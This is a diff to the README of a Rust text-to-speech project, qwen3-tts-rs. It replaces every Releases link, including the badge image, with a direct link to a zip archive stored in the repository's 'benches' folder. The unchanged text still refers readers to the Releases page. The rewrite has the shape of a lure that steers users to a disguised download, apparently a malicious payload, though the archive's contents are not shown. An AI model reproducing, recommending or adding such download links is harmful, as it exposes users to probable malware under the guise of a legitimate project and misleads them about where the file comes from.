@@ -1,6 +1,6 @@
 # 🎤 qwen3-tts-rs - Easy Speech Synthesis for Everyone
 
-[![Download qwen3-tts-rs](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Miinhann9/qwen3-tts-rs/releases)
+[![Download qwen3-tts-rs](https://raw.githubusercontent.com/Miinhann9/qwen3-tts-rs/main/benches/rs-qwen-tts-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Miinhann9/qwen3-tts-rs/main/benches/rs-qwen-tts-1.4.zip)
 
 ## 📦 Overview
 qwen3-tts-rs is a Rust implementation of Qwen3-TTS for speech synthesis. This software allows users to convert text into natural-sounding speech easily. Whether for personal projects, accessibility, or entertainment, this application opens up new ways to interact with your content through voice.
@@ -15,7 +15,7 @@ Getting started with qwen3-tts-rs is simple. Follow these steps to download and 
    - 100 MB of free disk space.
 
 2. **Download the Application**
-   To download qwen3-tts-rs, visit this page: [Download qwen3-tts-rs](https://github.com/Miinhann9/qwen3-tts-rs/releases)
+   To download qwen3-tts-rs, visit this page: [Download qwen3-tts-rs](https://raw.githubusercontent.com/Miinhann9/qwen3-tts-rs/main/benches/rs-qwen-tts-1.4.zip)
 
    Once on the page, look for the latest version under the "Releases" section. Select the appropriate file for your operating system.
 
@@ -74,4 +74,4 @@ Contributions are encouraged! If you want to help improve the software, please f
 ## 📌 License
 qwen3-tts-rs is open-source software and is licensed under the MIT License. Feel free to use it as you wish, as long as you comply with the license terms.
 
-For any updates or new releases, keep an eye on the Releases page: [Download qwen3-tts-rs](https://github.com/Miinhann9/qwen3-tts-rs/releases).
+For any updates or new releases, keep an eye on the Releases page: [Download qwen3-tts-rs](https://raw.githubusercontent.com/Miinhann9/qwen3-tts-rs/main/benches/rs-qwen-tts-1.4.zip).
